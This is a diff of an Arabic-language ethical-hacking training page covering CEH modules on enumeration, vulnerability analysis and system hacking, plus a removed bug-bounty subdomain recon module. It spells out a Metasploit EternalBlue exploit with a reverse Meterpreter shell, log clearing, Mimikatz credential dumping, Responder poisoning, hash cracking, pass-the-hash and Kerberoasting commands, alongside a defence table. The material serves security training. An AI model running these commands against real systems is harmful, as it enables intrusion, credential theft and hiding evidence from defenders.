+      <p>بروتوكول إدارة أجهزة الشبكة. الاعتماد على Community Strings الافتراضية (public/private) قد يكشف عن جداول التوجيه والأجهزة المتصلة.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">SNMP Arsenal</span></div>
+        <pre><code># استخراج شجرة معلومات متكاملة (MIB tree) من خادم يعتمد على public string
+snmpwalk -v 2c -c public 192.168.1.1</code></pre>
+      </div>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #ff4757;">
+      <div class="card-header"><h4>3. تعداد LDAP و RPC</h4></div>
+      <p><strong>LDAP (Port 389):</strong> استخراج أسماء المستخدمين الموثوقة في الـ Active Directory والهيكلية الإدارية لاستغلالها في الـ Social Engineering.<br>
+      <strong>RPC (Port 135):</strong> استكشاف التطبيقات التي تعمل في الخلفية عبر الـ Endpoint Mapper.</p>
+    </div>
+  </div>
+
+</div>
+
+      
+<!-- =======================================================
+     CEH MODULE 5: VULNERABILITY ANALYSIS
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-mod5" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">🚨</span> Vulnerability Analysis</h2>
+    <p class="hero-tagline">مرحلة تحديد الثغرات: تقييم المخاطر، أدوات الفحص، ونظام التصنيف العالمي (CVSS).</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-yellow);"></span> Module 05</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🔄</span>
+      <h3>دورة حياة إدارة الثغرات (Vuln Management Lifecycle)</h3>
+    </div>
+    
+    <div class="goal-cards-grid" dir="rtl">
+      <div class="goal-card">
+        <div class="goal-icon">1️⃣</div>
+        <h4>الاستكشاف والجرد</h4>
+        <div class="goal-subtitle">Discovery</div>
+        <p>جرد كامل لجميع الخوادم والبرمجيات داخل الشبكة.</p>
+      </div>
+      <div class="goal-card">
+        <div class="goal-icon">2️⃣</div>
+        <h4>تحديد الأولويات</h4>
+        <div class="goal-subtitle">Prioritization</div>
+        <p>فرز الأصول والتركيز على الأنظمة الحرجة (Critical) أولاً.</p>
+      </div>
+      <div class="goal-card">
+        <div class="goal-icon">3️⃣</div>
+        <h4>التقييم والفحص</h4>
+        <div class="goal-subtitle">Assessment</div>
+        <p>مسح الأصول باستخدام أدوات أوتوماتيكية للبحث عن الثغرات.</p>
+      </div>
+      <div class="goal-card">
+        <div class="goal-icon">4️⃣</div>
+        <h4>التقارير</h4>
+        <div class="goal-subtitle">Reporting</div>
+        <p>تصدير مخرجات الفحص في هيئة تقارير فنية تحدد مسار المعالجة.</p>
+      </div>
+      <div class="goal-card">
+        <div class="goal-icon">5️⃣</div>
+        <h4>المعالجة والترقيع</h4>
+        <div class="goal-subtitle">Remediation</div>
+        <p>ترقيع الثغرات (Patching) أو تطبيق Mitigation لتقليص الخطر.</p>
+      </div>
+      <div class="goal-card" style="border-color: #00e5a0;">
+        <div class="goal-icon" style="color: #00e5a0;">6️⃣</div>
+        <h4 style="color: #00e5a0;">التحقق</h4>
+        <div class="goal-subtitle">Verification</div>
+        <p>فحص استدراكي للتأكد من اختفاء الثغرة وعدم توليد ثغرات جديدة.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">📊</span>
+      <h3>نظام التقييم العالمي للثغرات (CVSS Scoring)</h3>
+    </div>
+    
+    <div class="mistakes-practices-grid" dir="rtl">
+      <div class="practice-card bad" style="border-left: 4px solid #2ed573;">
+        <div class="card-header"><h4>منخفض ومتوسط (Low & Medium)</h4></div>
+        <p><strong>Low (0.1 - 3.9)</strong> | <strong>Medium (4.0 - 6.9)</strong></p>
+        <p>ثغرات تتطلب شروطاً معقدة لاستغلالها أو تأثيرها محدود. يجب معالجتها بعد تأمين الأنظمة الحرجة.</p>
+      </div>
+      
+      <div class="practice-card bad" style="border-left: 4px solid #ff4757;">
+        <div class="card-header"><h4 style="color:#ff4757;">عالي وحرج (High & Critical)</h4></div>
+        <p><strong>High (7.0 - 8.9)</strong> | <strong>Critical (9.0 - 10.0)</strong></p>
+        <p>ثغرات يسهل استغلالها عن بُعد (RCE) ولا تتطلب مصادقة (Unauthenticated). المعالجة هنا <strong>فورية وإلزامية</strong>.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🛡️</span>
+      <h3>أدوات الفحص الاحترافية (Vulnerability Scanners)</h3>
+    </div>
+    
+    <div class="rd-compare-grid">
+      <div class="rd-compare-col good" style="border-color: #00b4d8;">
+        <div class="rd-compare-title">🔵 Nessus (Commercial)</div>
+        <ul class="rd-compare-list">
+          <li>الأداة الأقوى عالمياً، من شركة Tenable.</li>
+          <li>قاعدة بيانات ضخمة (Plugins) تتحدث لحظياً.</li>
+          <li>تقارير تفصيلية موجهة للإدارة وللمهندسين.</li>
+        </ul>
+      </div>
+      <div class="rd-compare-col good" style="border-color: #00e5a0;">
+        <div class="rd-compare-title">🟢 OpenVAS (Open Source)</div>
+        <ul class="rd-compare-list">
+          <li>البديل المجاني المفتوح المصدر الأقوى لـ Nessus.</li>
+          <li>يعتمد على الـ NVT (Network Vulnerability Tests).</li>
+          <li>مدمج كإطار عمل متكامل للفحص المستمر.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+
+
+      
+<!-- =======================================================
+     CEH MODULE 6: SYSTEM HACKING (DEEP DIVE)
+     ======================================================= -->
+<div class="meth-content-view" id="meth-content-sys-hack" style="display:none;" dir="rtl">
+  
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">💻</span> System Hacking (CEH v12)</h2>
+    <p class="hero-tagline">مرحلة السيطرة الكاملة: من كسر الحماية إلى زرع الأبواب الخلفية والتخفي.</p>
+    <div class="hero-meta">
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-red);"></span> Module 6</span>
+      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">📌</span>
+      <h3>المراحل الخمس لاختراق الأنظمة (The 5 Stages)</h3>
+    </div>
+    <div class="goal-cards-grid" dir="rtl">
+      
+      <div class="goal-card">
+        <div class="goal-icon">🔑</div>
+        <h4>1. الحصول على الوصول</h4>
+        <div class="goal-subtitle">Gaining Access</div>
+        <p>تجاوز آليات الحماية عبر كسر كلمات المرور، هجمات الشبكة (MitM)، أو استغلال الثغرات (Exploits) للوصول الأولي.</p>
+      </div>
+
+      <div class="goal-card">
+        <div class="goal-icon">⬆️</div>
+        <h4>2. تصعيد الصلاحيات</h4>
+        <div class="goal-subtitle">Escalating Privileges</div>
+        <p>الانتقال من مستخدم عادي إلى (Administrator/SYSTEM) أو (Root) عبر استغلال الـ Misconfigurations أو ثغرات النواة (Kernel).</p>
+      </div>
+
+      <div class="goal-card">
+        <div class="goal-icon">⚙️</div>
+        <h4>3. تنفيذ التطبيقات</h4>
+        <div class="goal-subtitle">Executing Applications</div>
+        <p>تشغيل برمجيات خبيثة كراصد لوحة المفاتيح (Keyloggers) و (RATs) لجمع المعلومات السرية وتوسيع نطاق السيطرة.</p>
+      </div>
+
+      <div class="goal-card">
+        <div class="goal-icon">🚪</div>
+        <h4>4. الحفاظ على الوصول</h4>
+        <div class="goal-subtitle">Maintaining Access</div>
+        <p>زرع الـ Backdoors، استخدام الـ Rootkits، و Alternate Data Streams (ADS) لضمان العودة مستقبلاً بأمان.</p>
+      </div>
+
+      <div class="goal-card">
+        <div class="goal-icon">🧹</div>
+        <h4>5. مسح الآثار</h4>
+        <div class="goal-subtitle">Clearing Tracks</div>
+        <p>حذف أو التلاعب بسجلات النظام (Event Logs) لمنع اكتشاف الاختراق من قبل فرق الـ SOC وأنظمة הـ SIEM.</p>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">⚔️</span>
+      <h3>أسلحة وأوامر الاستغلال المتقدمة (Arsenal & Commands)</h3>
+    </div>
+
+    <div class="cyber-card">
+      <div class="card-header"><h4>1. استغلال ثغرات النظام (Metasploit)</h4></div>
+      <p>يُستخدم إطار عمل Metasploit لاستغلال ثغرات معينة (مثل SMB) وفتح جلسة Meterpreter للتحكم العكسي.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">Metasploit Console - EternalBlue (MS17-010)</span></div>
+        <pre><code>msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.50
+set LHOST 192.168.1.10
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+exploit</code></pre>
+      </div>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">Meterpreter - مسح الآثار (Clearing Tracks)</span></div>
+        <pre><code># مسح كافة سجلات الويندوز (Application, System, Security) لتجنب الاكتشاف
+clearev</code></pre>
+      </div>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #f1c40f;">
+      <div class="card-header"><h4>2. استخراج الـ Hashes والتذاكر (Mimikatz)</h4></div>
+      <p>أداة Mimikatz قادرة على قراءة ذاكرة LSASS واستخراج كلمات المرور، الـ Hashes، وتذاكر Kerberos.</p>
+      <div class="tree-container" style="direction:ltr; text-align:left; font-family:'Fira Code', monospace; margin-bottom:15px; background:rgba(0,0,0,0.2); padding:15px; border-radius:8px; border-left:2px solid #f1c40f;">
+        <div style="color:#e2e8f0; margin-bottom:10px;">mimikatz # privilege::debug <span style="color:#94a3b8; font-size:0.85em;">// الحصول على صلاحيات Debug</span></div>
+        <div style="color:#e2e8f0; margin-bottom:10px;">mimikatz # sekurlsa::logonpasswords <span style="color:#94a3b8; font-size:0.85em;">// استخراج Passwords و NTLM Hashes</span></div>
+        <div style="color:#e2e8f0; margin-bottom:10px;">mimikatz # sekurlsa::tickets /export <span style="color:#94a3b8; font-size:0.85em;">// استخراج تذاكر TGT و TGS</span></div>
+        <div style="color:#e2e8f0;">mimikatz # kerberos::list <span style="color:#94a3b8; font-size:0.85em;">// عرض تذاكر كيربيروس الحالية في الذاكرة</span></div>
+      </div>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #ff4757;">
+      <div class="card-header"><h4>3. اصطياد الـ Hashes عبر الشبكة (Responder)</h4></div>
+      <p>يُستخدم في شبكات Windows لاستغلال فشل الـ DNS. عندما يبحث الضحية عن خادم غير موجود، يقوم Responder بتسميم استعلامات (LLMNR/NBT-NS) وإجبار الضحية على المصادقة للحصول على NTLMv2 Hash.</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">Responder - Poisoning</span></div>
+        <pre><code># الاستماع والتسميم لبروتوكولات الـ NetBIOS و LLMNR
+responder -I eth0 -rdw</code></pre>
+      </div>
+    </div>
+
+    <div class="cyber-card" style="--tool-color: #2ed573;">
+      <div class="card-header"><h4>4. كسر التشفير (Hashcat)</h4></div>
+      <p>الأداة الأقوى لكسر الـ Hashes باستخدام قدرة كروت الشاشة (GPU).</p>
+      <div class="cmd-block">
+        <div class="cmd-header"><span class="cmd-lang">Hashcat Modes</span></div>
+        <pre><code># NTLM Hash (من استخراج Mimikatz)
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt
+
+# NTLMv2 Hash (المُلتقط عبر Responder)
+hashcat -m 5600 -a 0 ntlmv2_hashes.txt rockyou.txt
+
+# Kerberos 5 TGS-REP (تذاكر Kerberoasting)
+hashcat -m 13100 -a 0 kerb_hashes.txt rockyou.txt</code></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🧠</span>
+      <h3>التقنيات والهجمات المتقدمة (Advanced Techniques)</h3>
+    </div>
+    
+    <div class="mistakes-practices-grid" dir="rtl">
+      
+      <div class="practice-card bad">
+        <div class="card-header"><h4>Pass the Hash (PtH)</h4></div>
+        <p>بدلاً من محاولة كسر הـ NTLM Hash كيميائياً، يقوم المهاجم بتمرير الـ Hash ذاته مباشرةً كـ "كلمة مرور شرعية" للمصادقة والدخول على أجهزة أخرى بالشبكة (Lateral Movement).</p>
+        <div style="margin-top:10px; background:rgba(0,0,0,0.3); padding:8px; border-radius:4px; font-family:monospace; color:#ff4757; direction:ltr;">
+          sekurlsa::pth /user:Admin /domain:local /ntlm:&lt;hash&gt; /run:cmd.exe
         </div>
       </div>
 
-
-      
-      <!-- Phase 0: Subdomain Enumeration — BUG BOUNTY OS MODULE -->
-      <div class="meth-content-view" id="meth-content-p0" style="display: block; --tool-color: #00e5ff;">
-
-        <!-- Phase Module Header -->
-        <div class="phase-module-header">
-          <div class="phase-module-icon">💻</div>
-          <div class="phase-module-meta">
-            <h1 class="phase-module-title">Subdomain Enumeration</h1>
-            <p class="phase-module-tagline">Build your full attack surface before touching the target — as used in real Bug Bounty</p>
-            <div class="phase-meta-badges">
-              <span class="badge badge-medium">🟠 Medium</span>
-              <span class="badge badge-time">⏱ 20-40 min</span>
-              <span class="badge badge-tool">🔧 subfinder · amass · httpx · nuclei</span>
-              <span class="badge badge-reward">💰 $500 → $5,000</span>
-            </div>
-          </div>
+      <div class="practice-card bad">
+        <div class="card-header"><h4>Kerberoasting</h4></div>
+        <p>يستهدف بروتوكول Kerberos. يطلب المهاجم تذكرة خدمة (TGS) لأي حساب Service Account. يتم تشفير التذكرة بالـ Hash الخاص بحساب الخدمة. يسحب المهاجم التذكرة ويكسرها Offline للحصول على الباسورد.</p>
+        <div style="margin-top:10px; background:rgba(0,0,0,0.3); padding:8px; border-radius:4px; font-family:monospace; color:#ff4757; direction:ltr;">
+          GetUserSPNs.py target.local/user:pass -request
         </div>
+      </div>
 
-        <!-- WHAT & GOAL -->
-        <div class="info-duo">
-          <div class="info-box what">
-            <h5>📖 What is it?</h5>
-            <p>عملية اكتشاف كل النطاقات الفرعية المرتبطة بالهدف من مصادر OSINT خارجية أو DNS نشط — بدون لمس الـ target مباشرة.</p>
-          </div>
-          <div class="info-box goal">
-            <h5>🎯 Goal</h5>
-            <p>بناء أوسع Attack Surface ممكن. كل subdomain = نقطة دخول: Takeover / Admin panel / Dev environment / API مكشوف.</p>
-          </div>
-        </div>
+      <div class="practice-card bad">
+        <div class="card-header"><h4>DLL Hijacking</h4></div>
+        <p>يبحث نظام الويندوز عن ملفات הـ DLL بترتيب معين. إذا وضع المهاجم ملف DLL خبيث بنفس الاسم في مجلد يتم البحث فيه قبل مجلد النظام الأساسي، سيتم تشغيله بصلاحيات البرنامج العالية.</p>
+      </div>
 
-        <!-- DECISION TREE — Real Branching -->
-        <p class="os-section-label">🌳 Decision Tree — Follow the Path</p>
-        <div class="cyber-card">
-          <div class="card-header"><h3>🌳 Interactive Decision Tree — انقر على إجابتك</h3></div>
-          <div class="decision-tree">
+    </div>
+  </div>
 
-            <!-- ROOT QUESTION -->
-            <div style="margin-bottom:14px;">
-              <div class="dt-question" onclick="dtBranch('dtq1y','dtq1n')">
-                <div class="dt-question-text">🚦 هل عندك scope واضح من الـ program؟ (*.target.com أم target.com فقط؟)</div>
-              </div>
-              <div class="dt-branches">
-                <div class="dt-answer-yes" onclick="dtBranch('dtq1y','dtq1n')">
-                  <span>YES</span><span class="dt-answer-text">عندي scope واضح</span>
-                  <span class="dt-arrow-to">→ ابدأ Passive Recon</span>
-                </div>
-                <div class="dt-answer-no" onclick="dtBranch('dtq1n','dtq1y')">
-                  <span>NO</span><span class="dt-answer-text">غير متأكد</span>
-                  <span class="dt-arrow-to">→ اقرأ الـ Policy أولاً</span>
-                </div>
-              </div>
-              <div id="dtq1n" class="dt-result-box">
-                <div class="dt-result-title">⛔ Stop — اقرأ الـ Policy أولاً</div>
-                <div class="dt-result-text">
-                  قبل أي شيء: افتح صفحة الـ program على HackerOne / Bugcrowd وحدد:<br>
-                  • ما هو الـ in-scope? (wildcard *.target.com أم subdomain محددة؟)<br>
-                  • ما المستثنى؟ (production DB, payment systems, 3rd party)<br>
-                  • هل مسموح بـ automated scanning؟<br>
-                  ثم ارجع وابدأ.
-                </div>
-              </div>
-              <div id="dtq1y" class="dt-result-box">
-                <div class="dt-result-title">✅ شغّل Passive Recon — ثم أجب:</div>
-                <div class="dt-result-text">
-                  <code>subfinder + amass + assetfinder + gau</code> → دمج النتائج → <code>sort -u</code>
-                </div>
-                <!-- Q2 Nested -->
-                <div style="margin-top:12px;">
-                  <div class="dt-question" onclick="dtBranch('dtq2y','dtq2n')">
-                    <div class="dt-question-text">📊 هل وجدت 100+ subdomain من الـ Passive Recon؟</div>
-                  </div>
-                  <div class="dt-branches">
-                    <div class="dt-answer-yes" onclick="dtBranch('dtq2y','dtq2n')">
-                      <span>YES</span><span class="dt-answer-text">نتائج كثيرة</span>
-                      <span class="dt-arrow-to">→ Live Check بـ httpx</span>
-                    </div>
-                    <div class="dt-answer-no" onclick="dtBranch('dtq2n','dtq2y')">
-                      <span>NO</span><span class="dt-answer-text">نتائج قليلة</span>
-                      <span class="dt-arrow-to">→ مصادر إضافية</span>
-                    </div>
-                  </div>
-                  <div id="dtq2n" class="dt-result-box">
-                    <div class="dt-result-title">🔍 جرب مصادر إضافية</div>
-                    <div class="dt-result-text">
-                      • <code>crt.sh/?q=%.target.com</code> — Certificate Transparency<br>
-                      • Shodan: <code>ssl.cert.subject.CN:target.com</code><br>
-                      • Google: <code>site:*.target.com -www</code><br>
-                      • GitHub: <code>"target.com" extension:js</code><br>
-                      • <code>amass enum -active -brute -d target.com</code>
-                    </div>
-                  </div>
-                  <div id="dtq2y" class="dt-result-box">
-                    <div class="dt-result-title">✅ شغّل httpx — ثم أجب:</div>
-                    <div class="dt-result-text"><code>httpx -l all_subs.txt -status-code -title -tech-detect</code></div>
-                    <!-- Q3 Nested -->
-                    <div style="margin-top:12px;">
-                      <div class="dt-question" onclick="dtBranch('dtq3y','dtq3n')">
-                        <div class="dt-question-text">🔴 هل وجدت: dev / staging / admin / test / api في أسماء الـ subdomains؟</div>
-                      </div>
-                      <div class="dt-branches">
-                        <div class="dt-answer-yes" onclick="dtBranch('dtq3y','dtq3n')">
-                          <span>YES</span><span class="dt-answer-text">وجدت</span>
-                          <span class="dt-arrow-to">→ أولوية قصوى!</span>
-                        </div>
-                        <div class="dt-answer-no" onclick="dtBranch('dtq3n','dtq3y')">
-                          <span>NO</span><span class="dt-answer-text">لم أجد</span>
-                          <span class="dt-arrow-to">→ فحص CNAME + Ports</span>
-                        </div>
-                      </div>
-                      <div id="dtq3y" class="dt-result-box">
-                        <div class="dt-result-title">🎯 HIGH PRIORITY — Dev/Staging/Admin Found!</div>
-                        <div class="dt-result-text">
-                          هذه بيئات اختبار غالباً حمايتها أضعف:<br>
-                          • Default creds: <code>admin:admin</code>, <code>test:test</code>, <code>admin:password123</code><br>
-                          • Debug endpoints: <code>/debug</code>, <code>/console</code>, <code>/phpinfo.php</code>, <code>/.env</code><br>
-                          • APIs بدون auth: <code>/api/v1/users</code>, <code>/internal/</code><br>
-                          💰 هذا النوع يعطي $500-$5,000 بسهولة نسبياً
-                        </div>
-                      </div>
-                      <div id="dtq3n" class="dt-result-box">
-                        <div class="dt-result-title">→ فحص CNAME ثم Port Scan</div>
-                        <div class="dt-result-text">
-                          • <code>dig sub.target.com CNAME</code> على كل 404 response<br>
-                          • NXDOMAIN = Takeover محتمل → راجع قسم الـ Takeover أدناه<br>
-                          • <code>naabu -l alive.txt -p 6379,9200,5601,2375,27017</code>
-                        </div>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
+  <div class="meth-section">
+    <div class="section-header">
+      <span class="section-icon">🛡️</span>
+      <h3>استراتيجيات الدفاع والحماية (Mitigation & SOC Defense)</h3>
+    </div>
+    
+    <div class="table-wrapper">
+      <table class="interactive-table" dir="rtl">
+        <thead>
+          <tr>
+            <th>الهجوم (The Attack)</th>
+            <th>الحل التقني (Mitigation Strategy)</th>
+            <th>مراقبة السجلات (SOC / Event Logs)</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>LLMNR/NBT-NS Poisoning</strong></td>
+            <td>إيقاف البروتوكولات تماماً عبر الـ Group Policy (GPO).</td>
+            <td>مراقبة حركة البث (Broadcast Traffic) للبروتوكولات 5355 و 137.</td>
+          </tr>
+          <tr>
+            <td><strong>Pass the Hash (PtH)</strong></td>
+            <td>تطبيق LAPS لتوليد باسوردات عشوائية ومختلفة لكل Local Admin.</td>
+            <td>Event ID `4624` (تسجيل دخول) باستخدام NTLM بدل Kerberos.</td>
+          </tr>
+          <tr>
+            <td><strong>Kerberoasting</strong></td>
+            <td>استخدام كلمات مرور معقدة جداً للـ Service Accounts وتفعيل Kerberos Armoring (FAST).</td>
+            <td>Event ID `4769` (TGS Request) المتكررة بشكل غير طبيعي.</td>
+          </tr>
+          <tr>
+            <td><strong>Mimikatz & Memory Dumping</strong></td>
+            <td>تفعيل Credential Guard وأنظمة EDR متطورة.</td>
+            <td>مراقبة الحقن في عملية `lsass.exe` أو طلبات الصلاحيات العالية.</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
 
-            <!-- BONUS: 404 Check -->
-            <div style="margin-top:14px; padding-top:14px; border-top:1px solid rgba(255,255,255,0.05);">
-              <div class="dt-question" onclick="dtBranch('dtq4y')">
-                <div class="dt-question-text">🔍 بونص: هل وجدت subdomain يظهر "Web Site not found" أو "NoSuchBucket"؟</div>
-              </div>
-              <div id="dtq4y" class="dt-result-box">
-                <div class="dt-result-title">🚨 Subdomain Takeover محتمل!</div>
-                <div class="dt-result-text">
-                  • شغّل: <code>dig sub.target.com CNAME</code><br>
-                  • إذا رجع CNAME → خدمة سحابية → ثم NXDOMAIN = Dangling DNS = Takeover!<br>
-                  • راجع: <code>nuclei -l all_subs.txt -t nuclei-templates/takeovers/</code><br>
-                  • Fingerprints: Azure (azurewebsites.net), GitHub Pages, Heroku, Fastly, Shopify
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <!-- TOOLS -->
-        <p class="os-section-label">🔧 Tools</p>
-        <div class="tool-cards-row">
-          <div class="tool-card-mini" onclick="showToolInfo('subfinder', 'أداة سريعة جداً تعتمد على المصادر المفتوحة (OSINT) لجمع النطاقات الفرعية دون الاتصال المباشر بالهدف (Passive).')" style="cursor:pointer">
-            <div class="tool-name">subfinder</div>
-            <div class="tool-tag">Passive OSINT — أسرع وأوسع تغطية</div>
-          </div>
-          <div class="tool-card-mini" onclick="showToolInfo('amass', 'أداة قوية وعميقة تقوم ببحث مكثف وشامل (Passive & Active) ومحاولة تخمين النطاقات المخفية.')" style="cursor:pointer">
-            <div class="tool-name">amass</div>
-            <div class="tool-tag">Deep OSINT + DNS brute — الأشمل والأبطأ</div>
-          </div>
-          <div class="tool-card-mini" onclick="showToolInfo('assetfinder', 'أداة خفيفة وسريعة تركز على استخراج النطاقات من شهادات التشفير (crt.sh).')" style="cursor:pointer">
-            <div class="tool-name">assetfinder</div>
-            <div class="tool-tag">crt.sh + Facebook CT — سريع</div>
-          </div>
-          <div class="tool-card-mini" onclick="showToolInfo('httpx', 'أداة سريعة للتأكد من النطاقات الحية (Live) وتحديد التكنولوجيا المستخدمة (Tech Detect) وحالة السيرفر (Status Code).')" style="cursor:pointer">
-            <div class="tool-name">httpx</div>
-            <div class="tool-tag">Live check + tech + status codes</div>
-          </div>
-          <div class="tool-card-mini" onclick="showToolInfo('nuclei', 'أداة فحص تعتمد على قوالب (Templates) لاكتشاف الثغرات المعروفة (CVEs) وثغرات الـ Takeover بسهولة.')" style="cursor:pointer">
-            <div class="tool-name">nuclei</div>
-            <div class="tool-tag">Takeover templates + CVEs</div>
-          </div>
-          <div class="tool-card-mini" onclick="showToolInfo('naabu', 'أداة Port Scanner سريعة جداً لاكتشاف المنافذ المفتوحة غير المعيارية على السيرفرات.')" style="cursor:pointer">
-            <div class="tool-name">naabu</div>
-            <div class="tool-tag">Port scan — منافذ غير معيارية</div>
-          </div>
-        </div>
-
-        <!-- COMMANDS + EXPECTED OUTPUT -->
-        <p class="os-section-label">💻 Commands</p>
-
-        <!-- Step 1: Passive -->
-        <div class="cyber-card">
-          <div class="card-header"><h3>① Passive Collection</h3></div>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">subfinder -d target.com -all -recursive -silent -o subfinder.txt
-amass enum -passive -d target.com -o amass.txt
-assetfinder --subs-only target.com > assetfinder.txt
-gau target.com | grep -oP '(?<=://)[^/?]+' | sort -u > gau.txt
-
-# Merge & deduplicate all sources
-cat subfinder.txt amass.txt assetfinder.txt gau.txt | sort -u > all_subs.txt
-echo "[*] Total unique: $(wc -l < all_subs.txt)"</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('subfinder -d target.com -all -recursive -silent -o subfinder.txt\namass enum -passive -d target.com -o amass.txt\nassetfinder --subs-only target.com > assetfinder.txt\ncat subfinder.txt amass.txt assetfinder.txt | sort -u > all_subs.txt', this)">📋 Copy</button>
-              <button class="cmd-btn run-btn" onclick="showToolInfo('subfinder', 'أداة سريعة جداً تعتمد على المصادر المفتوحة (OSINT) لجمع النطاقات الفرعية دون الاتصال المباشر بالهدف (Passive).')">▶ Simulate</button>
-            </div>
-          </div>
-          <div class="expected-output">
-            <div class="expected-output-header">⬇ EXPECTED OUTPUT</div>
-            <div class="expected-output-body">api.target.com
-<span class="hot">dev.target.com              ← HOT 🎯</span>
-<span class="hot">staging-auth.target.com     ← HOT 🎯</span>
-<span class="hot">admin.target.com            ← HOT 🎯</span>
-assets.target.com
-cdn.target.com
-mail.target.com
-...
-[*] Total unique: <span class="hot">347 subdomains</span>
-
-<span style="color:rgba(100,116,139,0.6)">Normal: 100-500 | Large targets: 500-2000+</span>
-<span style="color:rgba(100,116,139,0.6)">Flag: dev / staging / admin / test / api → check first</span></div>
-          </div>
-        </div>
-
-        <!-- Step 2: Live Check -->
-        <div class="cyber-card">
-          <div class="card-header"><h3>② Live Host Check + Fingerprint</h3></div>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">httpx -l all_subs.txt -status-code -title -tech-detect -ip -o alive.txt
-
-# Filter interesting targets
-grep -E "\[200\]|\[403\]|\[301\]" alive.txt > targets.txt
-echo "Live hosts: $(wc -l < alive.txt)"</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('httpx -l all_subs.txt -status-code -title -tech-detect -ip -o alive.txt\ngrep -E \"\\[200\\]|\\[403\\]|\\[301\\]\" alive.txt > targets.txt', this)">📋 Copy</button>
-              <button class="cmd-btn run-btn" onclick="showToolInfo('httpx', 'أداة سريعة للتأكد من النطاقات الحية (Live) وتحديد التكنولوجيا المستخدمة (Tech Detect) وحالة السيرفر (Status Code).')">▶ Simulate</button>
-            </div>
-          </div>
-          <div class="expected-output">
-            <div class="expected-output-header">⬇ EXPECTED OUTPUT</div>
-            <div class="expected-output-body">https://api.target.com [<span class="hot">200</span>] [API Portal] [Node.js, Express, nginx]
-https://<span class="hot">dev</span>.target.com [<span class="hot">200</span>] [DevEnv - Internal] [PHP/8.1, nginx]     <span class="hot">← TEST THIS</span>
-https://admin.target.com [<span class="crit">403</span>] [Forbidden] [Apache]                 <span class="hot">← TRY BYPASS</span>
-https://old.target.com [<span class="crit">404</span>] Not Found                               <span class="crit">← CHECK CNAME</span>
-https://cdn.target.com [301] → assets.cdn.net
-
-<span style="color:rgba(100,116,139,0.6)">403 = Try bypass headers | 404 = Check CNAME for Takeover | Dev = Default creds</span></div>
-          </div>
-        </div>
-
-        <!-- CHECKLIST -->
-        <p class="os-section-label">✅ Checklist — Saved Automatically</p>
-        <div class="cyber-card">
-          <div class="card-header"><h3>☑ Subdomain Enumeration Checklist</h3></div>
-          <ul class="phase-checklist" id="checklist-p0">
-            <li class="checklist-item" onclick="toggleCheck(this,'p0',0)">
-              <div class="check-box"></div>
-              <div class="check-label">شغّل <code>subfinder -d target.com -all -recursive -silent</code></div>
-            </li>
-            <li class="checklist-item" onclick="toggleCheck(this,'p0',1)">
-              <div class="check-box"></div>
-              <div class="check-label">شغّل <code>amass enum -passive -d target.com</code></div>
-            </li>
-            <li class="checklist-item" onclick="toggleCheck(this,'p0',2)">
-              <div class="check-box"></div>
-              <div class="check-label">شغّل <code>assetfinder --subs-only target.com</code> + <code>gau</code></div>
-            </li>
-            <li class="checklist-item" onclick="toggleCheck(this,'p0',3)">
-              <div class="check-box"></div>
-              <div class="check-label">دمج النتائج: <code>cat *.txt | sort -u > all_subs.txt</code></div>
-            </li>
-            <li class="checklist-item" onclick="toggleCheck(this,'p0',4)">
-              <div class="check-box"></div>
-              <div class="check-label">شغّل <code>httpx -l all_subs.txt -status-code -title -tech-detect</code></div>
-            </li>
-            <li class="checklist-item" onclick="toggleCheck(this,'p0',5)">
-              <div class="check-box"></div>
-              <div class="check-label">افحص <code>dev / staging / admin / test / api</code> subdomains أولاً</div>
-            </li>
-            <li class="checklist-item" onclick="toggleCheck(this,'p0',6)">
-              <div class="check-box"></div>
-              <div class="check-label">شغّل <code>dig CNAME</code> على كل 404 response</div>
-            </li>
-            <li class="checklist-item" onclick="toggleCheck(this,'p0',7)">
-              <div class="check-box"></div>
-              <div class="check-label">شغّل <code>nuclei -l all_subs.txt -t nuclei-templates/takeovers/</code></div>
-            </li>
-            <li class="checklist-item" onclick="toggleCheck(this,'p0',8)">
-              <div class="check-box"></div>
-              <div class="check-label">شغّل <code>naabu -l alive.txt -p 6379,9200,5601,27017,2375</code></div>
-            </li>
-          </ul>
-          <div class="checklist-progress-mini">
